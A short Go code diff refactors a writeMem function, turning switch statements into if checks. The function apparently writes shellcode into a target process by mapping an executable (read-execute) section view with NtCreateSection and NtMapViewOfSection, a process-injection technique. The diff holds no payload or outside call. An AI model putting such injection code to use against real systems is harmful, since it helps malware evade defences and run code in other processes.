@@ -22,8 +22,7 @@ func writeMem(s *state, sc []byte) (*state, error) {
 	var e error
 	var pHndl windows.Handle = s.proc
 
-	switch s.l.alloc {
-	case NtCreateSection:
+	if s.l.alloc == NtCreateSection {
 		pHndl = windows.CurrentProcess()
 	}
 
@@ -32,13 +31,12 @@ func writeMem(s *state, sc []byte) (*state, error) {
 		return nil, e
 	}
 
-	switch s.l.alloc {
-	case NtCreateSection:
+	if s.l.alloc == NtCreateSection {
 		// Create RX view
 		s.addr, e = w32.NtMapViewOfSection(
 			s.section,
 			s.proc,
-			uint64(s.sz),
+			s.sz,
 			w32.Accctrl.SubContainersOnlyInherit,
 			w32.Winnt.PageExecuteRead,
 		)
